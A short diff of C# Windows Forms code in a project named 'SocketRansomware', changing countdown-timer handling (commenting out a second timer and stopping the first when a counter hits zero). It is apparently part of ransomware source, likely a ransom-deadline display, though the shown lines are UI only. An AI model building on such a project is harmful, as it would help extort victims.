@@ -32,10 +32,10 @@ namespace SocketRansomware
             timer1.Interval = 1000;
             timer1.Start();
 
-            timer2 = new System.Windows.Forms.Timer();
+          /*  timer2 = new System.Windows.Forms.Timer();
             timer2.Tick += new EventHandler(count_down);
             timer2.Interval = 1000;
-            timer2.Start();
+            timer2.Start();*/
 
             
             lbDate1.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
@@ -63,12 +63,13 @@ namespace SocketRansomware
             }
 
             if (duration2 == 0)
-            {
-                timer2.Stop();
+            {  
+                timer1.Stop();
+              
             }
             else if (duration2 > 0)
             {
-                duration2--;
+                --duration2;
                 lbtimer2.Text = dt.AddSeconds(duration2).ToString("HH:mm:ss");
             }
         }
